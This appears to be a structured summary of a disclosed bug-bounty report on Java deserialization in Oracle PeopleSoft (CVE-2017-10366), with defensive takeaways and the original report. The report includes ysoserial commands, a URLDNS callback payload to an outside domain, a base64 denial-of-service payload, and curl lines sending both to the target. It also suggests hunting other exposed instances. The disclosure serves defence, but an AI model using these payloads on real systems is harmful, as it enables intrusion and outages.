# Remote Code Execution via Java Object Deserialization in Oracle PeopleSoft (CVE-2017-10366)

## Metadata
- **Source:** HackerOne
- **Report:** 329400 | https://hackerone.com/reports/329400
- **Submitted:** 2018-03-24
- **Reporter:** joaomatosf
- **Program:** US Department of Defense
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Unsafe Deserialization, Remote Code Execution, Denial of Service, CWE-502
- **CVEs:** CVE-2017-10366
- **Category:** memory-binary

## Summary
A critical Java object deserialization vulnerability exists in the Oracle PeopleSoft platform's monitor service, allowing unauthenticated attackers to execute arbitrary code or cause denial of service. The vulnerable endpoint deserializes untrusted Java objects without validation, enabling exploitation via malicious serialized payloads generated with ysoserial.

## Attack scenario
1. Attacker identifies the vulnerable PeopleSoft monitor service endpoint accessible over the internet
2. Attacker generates a malicious serialized Java object using ysoserial tool with URLDNS or similar gadget chain
3. Attacker sends the crafted payload via HTTP POST request to the monitor service
4. Server receives the payload and calls readObject() method to deserialize the untrusted data
5. During deserialization, gadget chain is triggered executing arbitrary code (RCE) or consuming heap memory (DoS)
6. Attacker achieves code execution or service unavailability

## Root cause
The monitor service endpoint deserializes Java objects received from untrusted sources without implementing type validation or filtering. The readObject() method processes all incoming serialized data, allowing attackers to craft malicious objects with gadget chains that execute code during deserialization.

## Attacker mindset
Opportunistic exploitation of known infrastructure vulnerability. Attacker recognized PeopleSoft as a common enterprise platform, identified the publicly exposed monitor service, and leveraged existing exploit tools (ysoserial) and well-documented gadget chains to demonstrate RCE impact through DNS exfiltration and DoS capabilities.

## Defensive takeaways
- Never deserialize untrusted data - block all public-facing deserialization endpoints entirely
- Network-level controls: restrict /monitor and similar service endpoints to internal networks only
- Implement input validation and type whitelisting for any serialization operations
- Use Java deserialization filters (JEP 290) to restrict allowable classes
- Regular security patching of PeopleSoft and dependent libraries (commonsCollections, etc.)
- Deploy Web Application Firewall (WAF) rules to detect serialized Java object patterns
- Maintain inventory of exposed Oracle PeopleSoft instances and monitor for exploitation attempts

## Variant hunting
Search for other publicly exposed Oracle PeopleSoft instances via Shodan/Censys. Test other service endpoints (/psc/*, /administrator) for similar deserialization vulnerabilities. Investigate whether other Java-based enterprise applications (JBoss, WebLogic, SAP) on DoD infrastructure share the same weakness. Review gadget chains beyond URLDNS (CommonsCollections, Spring Framework) for RCE variants.

## MITRE ATT&CK
- T1190
- T1203
- T1055
- T1499

## Notes
Report correlates to CVE-2017-10366 affecting Oracle PeopleSoft. Reporter responsibly demonstrated impact through DNS exfiltration rather than full RCE. DoS variant included but not executed due to service impact concerns. Critical finding on DoD infrastructure suggests widespread PeopleSoft exposure in federal networks. The vulnerability class (unsafe deserialization) remains prevalent despite gadget chain updates, reinforcing the principle that blocking deserialization entirely is more effective than library patching.

## Full report
<details><summary>Expand</summary>

SUMMARY:
====================

This report describes a vulnerability similar to that described in my other reports #329376, #329397, #329399

The DoD **`https://████/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod_test.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod_test.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod_test.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
`curl https://████/psc/EXPROD/ --data-binary`@payload`-k`

After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:42:26.332 queries: info: client ████#8059: query: dod_test.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
`curl https://████/psc/EXPROD/ --data-binary`@payload_dos`-k`

This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

</details>

---
*Analysed by Claude on 2026-05-12*
